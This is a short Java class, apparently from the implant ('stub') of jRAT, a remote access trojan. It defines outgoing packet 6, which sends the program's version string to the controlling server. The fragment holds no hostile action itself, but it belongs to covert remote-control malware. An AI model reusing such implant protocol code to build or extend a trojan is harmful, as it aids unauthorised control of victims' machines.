package io.jrat.stub.packets.outgoing;

import io.jrat.common.Version;
import io.jrat.common.io.StringWriter;
import java.io.DataOutputStream;


public class Packet6InitVersion extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(Version.getVersion());
	}

	@Override
	public short getPacketId() {
		return (byte) 6;
	}

}
